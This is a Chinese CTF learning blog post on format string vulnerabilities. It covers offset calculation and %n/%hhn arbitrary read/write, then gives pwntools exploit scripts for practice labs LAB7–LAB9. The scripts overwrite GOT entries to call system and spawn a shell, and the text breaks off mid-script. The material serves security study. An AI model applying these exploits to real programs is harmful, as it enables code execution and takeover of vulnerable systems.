@@ -1,0 +1,537 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>格式化字符串漏洞学习 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="前置知识：一些小技巧和知识：
+1234567891011121314151617181920212223242526272829303132333435363738这部分来自icemakr的博客32,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">格式化字符串漏洞学习</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="格式化字符串漏洞学习" class="">格式化字符串漏洞学习</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    35k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    32 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/format/" rel="tag">format</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h3><p>一些小技巧和知识：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-ecb4cb1ae7523d0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><a id="more"></a><br><img src="https://upload-images.jianshu.io/upload_images/9085575-b4f946cef413fa4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">这部分来自icemakr的博客</span><br><span class="line"></span><br><span class="line"><span class="number">32</span>位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line"><span class="string">'%&#123;&#125;$x'</span>.format(index)           // 读<span class="number">4</span>个字节</span><br><span class="line"><span class="string">'%&#123;&#125;$p'</span>.format(index)           // 同上面</span><br><span class="line"><span class="string">'$&#123;&#125;$s'</span>.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line"><span class="string">'%&#123;&#125;$n'</span>.format(index)           // 解引用，写入四个字节</span><br><span class="line"><span class="string">'%&#123;&#125;$hn'</span>.format(index)          // 解引用，写入两个字节</span><br><span class="line"><span class="string">'%&#123;&#125;$hhn'</span>.format(index)         // 解引用，写入一个字节</span><br><span class="line"><span class="string">'%&#123;&#125;$lln'</span>.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">////////////////////////////</span><br><span class="line"><span class="number">64</span>位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line"><span class="string">'%&#123;&#125;$x'</span>.format(index, num)      // 读<span class="number">4</span>个字节</span><br><span class="line"><span class="string">'%&#123;&#125;$lx'</span>.format(index, num)     // 读<span class="number">8</span>个字节</span><br><span class="line"><span class="string">'%&#123;&#125;$p'</span>.format(index)           // 读<span class="number">8</span>个字节</span><br><span class="line"><span class="string">'$&#123;&#125;$s'</span>.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line"><span class="string">'%&#123;&#125;$n'</span>.format(index)           // 解引用，写入四个字节</span><br><span class="line"><span class="string">'%&#123;&#125;$hn'</span>.format(index)          // 解引用，写入两个字节</span><br><span class="line"><span class="string">'%&#123;&#125;$hhn'</span>.format(index)         // 解引用，写入一个字节</span><br><span class="line"><span class="string">'%&#123;&#125;$lln'</span>.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">%<span class="number">1</span>$lx: RSI</span><br><span class="line">%<span class="number">2</span>$lx: RDX</span><br><span class="line">%<span class="number">3</span>$lx: RCX</span><br><span class="line">%<span class="number">4</span>$lx: R8</span><br><span class="line">%<span class="number">5</span>$lx: R9</span><br><span class="line">%<span class="number">6</span>$lx: 栈上的第一个QWORD</span><br></pre></td></tr></table></figure>
+
+<p>这里$n和$hhn等是针对%offset$n前面（32位）或者后面（64位）的地址而言的，是地址的4个字节写入还是地址的1个字节1个字节地写入的问题。</p>
+<h4 id="一、偏移量的计算"><a href="#一、偏移量的计算" class="headerlink" title="一、偏移量的计算"></a>一、偏移量的计算</h4><p>32位计算偏移量：<br>找漏洞函数printf家族，在printf（s）中下断点，然后输入AAAA，在gdb中计算偏移量：<br>offset = p/d   (0xbbbb-0xaaaa)/4（或者直接看最左边的16进制值即可）</p>
+<p>64位计算偏移量：</p>
+<p>%1$lx: RSI<br>%2$lx: RDX<br>%3$lx: RCX<br>%4$lx: R8<br>%5$lx: R9<br>%6$lx: 栈上的第一个QWORD</p>
+<p>offset = 地址在栈中相对于栈顶的偏移（看最左边的16进制数） +  6</p>
+<h4 id="二、利用技巧"><a href="#二、利用技巧" class="headerlink" title="二、利用技巧"></a>二、利用技巧</h4><p>1、任意地址读：</p>
+<p>%offset$p:读取地址</p>
+<p>%offset$s:读取地址上的内容</p>
+<p>泄露真实地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、泄露libc_start_main:</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">"%31$p"</span>)</span><br><span class="line">main_addr = int(p.recvline(),<span class="number">16</span>)<span class="number">-247</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、泄露已有的函数的got真实地址（加个标志位aa）</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">p.recv()</span><br><span class="line">payload =p32(puts_got)+<span class="string">'aa%6$s'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'aa'</span>)</span><br><span class="line">info = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(info)</span><br></pre></td></tr></table></figure>
+
+<p>2、任意地址写：</p>
+<p>%A$n，是把栈地址的内容进行修改，如果内容也是地址，就改这个第二重地址里面的内容（写入的是地址指针里面的内容）</p>
+<p>例如往偏移为7的地址中写入218这个数（地址算4个字节）：</p>
+<p>payload = p32(地址) + ‘%(218-4)c%7$n（往地址的指针的位置写入）</p>
+<p>通过任意地址写还可以改写got表：</p>
+<p>payload = fmtstr_payload(offset ，{xxx_got:system_addr})（记住这条神奇函数）</p>
+<p>这里建议手撕，因为有0截断就完蛋了，但是0截断也不怕，可以写在后面哈哈哈</p>
+<p>32位单字节手撕：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fmtstr_payload(<span class="number">6</span>, &#123;<span class="number">0x08048000</span>:<span class="number">0x10203040</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\x00\x80\x04\x08</span><br><span class="line">\x01\x80\x04\x08</span><br><span class="line">\x02\x80\x04\x08</span><br><span class="line">\x03\x80\x04\x08</span><br><span class="line">%<span class="number">48</span>c%<span class="number">6</span>$hhn</span><br><span class="line">%<span class="number">240</span>c%<span class="number">7</span>$hhn</span><br><span class="line">%<span class="number">240</span>c%<span class="number">8</span>$hhn</span><br><span class="line">%<span class="number">240</span>c%<span class="number">9</span>$hhn</span><br></pre></td></tr></table></figure>
+
+<p>例如对0x08048000写入16+48 = 64 = 0x40<br>对0x08048000写入0x40+240 = 304 = (uint8)0x130 = 0x30</p>
+<p>（uint8，无符号整形，范围0到256，超了就取16进制的末尾两位的原理）</p>
+<p>也就是说大于256个字节的都要一个一个字节地写入，否则直接4个字节写入~</p>
+<h5 id="以上是32位的情况，那么64位的呢？"><a href="#以上是32位的情况，那么64位的呢？" class="headerlink" title="以上是32位的情况，那么64位的呢？"></a>以上是32位的情况，那么64位的呢？</h5><p>64位的特别之处在于一开始有\x00截断，所以只能手撕，所以地址写在最后面，那么偏移就变了，于是需要计算出真正的偏移，例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod1=<span class="string">"a"</span>*<span class="number">4</span>+<span class="string">"%"</span>+str(int(hex_one_gadget[<span class="number">-4</span>:],<span class="number">16</span>)<span class="number">-4</span>)+<span class="string">"c"</span>+<span class="string">"%8$hn"</span>+p64(exit_got)</span><br></pre></td></tr></table></figure>
+
+<p>首先4个a是用来对齐的，看看怎么算出来的<del>首先%1字节，str占用5个字节（10进制，自己可以算），c占1，%x$hn占用5个，一共12个了，由于64位栈中一次能存8个字节，那么要铺满2个栈位置，16个字节，就差4个字节，铺满6和7的位置后，8的位置就是exit的got表地址了，这就是偏移为8的原因，由于每次写入的是双字节，所以需要写3次地址才能实现got表覆盖</del>单字节和四字节写入道理一样，自己探索下。</p>
+<p>给个图看看上面所说的东西：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-9ebec1ad6a5ca8a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>下面看看LAB7、8、9的题目加深理解：</p>
+<h3 id="练习题：LAB7："><a href="#练习题：LAB7：" class="headerlink" title="练习题：LAB7："></a>练习题：LAB7：</h3><p>按照惯例分析一波，checksec，拖进ida分析：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-6e8cedaaf74977ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-61f7450ecc6ced0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-f710053859e56ab9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>偏移为10，直接改password的值为5，再输入5，直接上payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./crack'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./crack'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7711</span>)</span><br><span class="line"><span class="comment">#arch也可以是i386~看文件</span></span><br><span class="line">bss = <span class="number">0x0804A048</span></span><br><span class="line">printf_got = <span class="number">0x804A010</span></span><br><span class="line">system_plt = <span class="number">0x8048400</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#往bss中写入0x00000005的三种方法：</span></span><br><span class="line"><span class="comment">#payload = fmtstr_payload(10,bss:5)</span></span><br><span class="line"><span class="comment">#payload = p32(bss) + '%1c%10$n'</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p32(bss)</span><br><span class="line">payload += p32(bss+<span class="number">1</span>)</span><br><span class="line">payload += p32(bss+<span class="number">2</span>)</span><br><span class="line">payload += p32(bss+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">'%245c%10$hhn'</span></span><br><span class="line">payload += <span class="string">'%251c%11$hhn'</span></span><br><span class="line">payload += <span class="string">'%256c%12$hhn'</span></span><br><span class="line">payload += <span class="string">'%256c%13$hhn'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What your name ? "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">也可以泄露password的值再填泄露值</span><br></pre></td></tr></table></figure>
+
+<p>即可构造payload：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-1fb28eedd10c4af3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-b28eb3e09a214421.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>因为我们泄露的随机数可能 大于4位，而我们泄露的只到4位，所以有时成功不了<del>但是方法一是绝对可以的，这题试过修改got表调用system函数，但是发现行不通哎</del>就目前这两种解法。</p>
+<h3 id="练习题LAB8"><a href="#练习题LAB8" class="headerlink" title="练习题LAB8:"></a>练习题LAB8:</h3><p>还是按照套路和逻辑来，栈溢出保护，格式化字符串漏洞~<br><img src="https://upload-images.jianshu.io/upload_images/9085575-4a3987c3803018af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-e1bf5a859e58ceab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>接下来分析逻辑：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-2973a13ad2c9828a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>很清晰的逻辑，要么修改magic的值，要么直接调用system函数。<br>在printf那里下断点，计算出偏移量为7，直接上payload：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-be284f1f10967c7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-7bdb2c838f7a2e9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>调用自身的system的catflag函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh = process(<span class="string">'./craxme'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./craxme'</span>)</span><br><span class="line">magic = <span class="number">0x0804A038</span></span><br><span class="line">puts_got = <span class="number">0x0804A018</span></span><br><span class="line">catflag = <span class="number">0x080485D8</span></span><br><span class="line">system_plt = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">call_printf = <span class="number">0x8048596</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">7</span>,&#123;puts_got:catflag&#125;)</span><br><span class="line">sh.recvuntil(<span class="string">"Give me magic :"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>getshell的做法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh = process(<span class="string">'./craxme'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./craxme'</span>)</span><br><span class="line">magic = <span class="number">0x0804A038</span></span><br><span class="line">puts_got = <span class="number">0x0804A018</span></span><br><span class="line">catflag = <span class="number">0x080485D8</span></span><br><span class="line">system_plt = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">call_printf = <span class="number">0x8048596</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">7</span>,&#123;puts_got:call_printf,printf_got:system_plt&#125;)</span><br><span class="line">sh.recvuntil(<span class="string">"Give me magic :"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里尝试了直接调用发现行不通，那就间接调用system函数，绕个圈子去调用，记住一次性不行就两次性~</p>
+<p>总结出修改got表就像把ret改成自己想要跳转到的函数一样样的~</p>
+<p>也就是说任意地址读可以泄露出想要的数据，任意地址写可以改变程序的执行流程，原理也懂就行了~</p>
+<h3 id="练习题LAB9："><a href="#练习题LAB9：" class="headerlink" title="练习题LAB9："></a>练习题LAB9：</h3><p>逻辑一样，checksec，再拖进去ida分析：<br><img src="https://upload-images.jianshu.io/upload_images/9085575-b91bed7a8b14dbc5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-43529838ea9c021f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>发现是在bss段，哦豁完蛋，又是新姿势，跟着大佬的writeup，看了几篇，明白了利用机制，原来一开始我们直接在格式化字符串偏移的位置写我们的got地址，然后%A$n写入要替换的地址，很方便，但是现在在bss中，直接写写不动，那么可以通过间接写写入，最根本的思路：首先我们需要2个指针地址，能够实现写入地址，在这两个地址上先写printf的got表地址的前后两个字节，泄露got真实地址，然后再改写为system真实地址的前后两个字节，就实现了间接改写got表，这样通过栈上指向栈另一处的指针，比如保存的ebp。通过%n和保存的ebp，我们就能想保存的ebp所指向的地址（栈上的另一处，前ebp）处写任意值，这样我们在栈上就有了一个任意构造的指针，通过这个任意指针我们就可以任意地址读和任意地址写。<br><img src="https://upload-images.jianshu.io/upload_images/9085575-0914d8dbfc829f24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>来进行构造：<br>这里有用的就是这四条，分别是设置为ebp1、fmt7、ebp2、fmt11，而他们相对于格式化字符串的偏移分别是6、7、10、11（直接数），思路如下：<br>1.通过ebp_1使ebp_2指向fmt_7<br>2.通过ebp_2将fmt_7处的内容覆盖成printf_got<br>3.通过ebp_1使ebp_2指向fmt_11<br>4.通过ebp_2将fmt_11处的内容修改成printf_got+2<br>5.通过fmt_7将printf_got地址泄露出来<br>6.计算出system函数的地址 ,将system函数地址写入printf在got表的地址<br>具体做法是将 system函数地址的前两个字节写入fmt_7,后两个字节写入 fmt_11<br>7.执行printf函数相当于执行system函数<br>8.输入”/bin/sh”字符串，让system函数从栈中取参数getshell</p>
+<p>这里画个图帮助理解：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-0f1cfb3dca6863dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>我们一步一步地分析思路，首先%数字$n，是把栈地址的内容进行修改（写入数据），如果内容是地址，就改这个内容地址里面的东西，所以第一步，因为ebp1存的是ebp2的地址，所以要改的是ebp2地址里面的内容，发现是某一个地址，把它改成fmt7地址，所以ebp2地址里面的内容变成了fmt7的地址，第二步，覆盖printf_got，ebp2的内容是fmt7地址，所以要修改的是fmt7地址里面的内容，所以fmt7地址里面的内容变成了printf_got，第三步和第四步类似，这样就实现了泄露printf_got表真实地址，然后借此计算出system函数的真实地址，再分别写入2个地址，就相当于执行system函数，输入/bin/sh即可。具体payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh = process(<span class="string">'./playfmt'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./playfmt'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">printf_got = elf.got[<span class="string">"printf"</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">printf_libc = libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">sh.recv()</span><br><span class="line">log.info(<span class="string">"******leak printf_got******"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%6$x'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">ebp2 = int(sh.recv(),<span class="number">16</span>)</span><br><span class="line">ebp1 = ebp2 - <span class="number">0x10</span></span><br><span class="line">fmt7 = ebp2 - <span class="number">0x0c</span></span><br><span class="line">fmt11 = ebp2 + <span class="number">0x04</span></span><br><span class="line">log.info(<span class="string">"printf_got--&gt;p[%s]"</span>%hex(printf_got))</span><br><span class="line">log.info(<span class="string">"ebp_1--&gt;p[%s]"</span>%hex(ebp1))</span><br><span class="line">log.info(<span class="string">"ebp_2--&gt;p[%s]"</span>%hex(ebp2))</span><br><span class="line">log.info(<span class="string">"fmt_7--&gt;p[%s]"</span>%hex(fmt7))</span><br><span class="line">log.info(<span class="string">"fmt_11--&gt;p[%s]"</span>%hex(fmt11))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%"</span> + str(fmt7 &amp; <span class="number">0x0000ffff</span>) + <span class="string">'c%6$hn'</span></span><br><span class="line"><span class="comment">#ebp1 --&gt; ebp2 --&gt; fmt7,取fmt7的低位两个字节，高位是ffff不变</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="comment">#ebp2 --&gt; fmt7 --&gt; printf_got</span></span><br><span class="line">payload = <span class="string">"%"</span> + str(printf_got &amp; <span class="number">0x0000ffff</span>) + <span 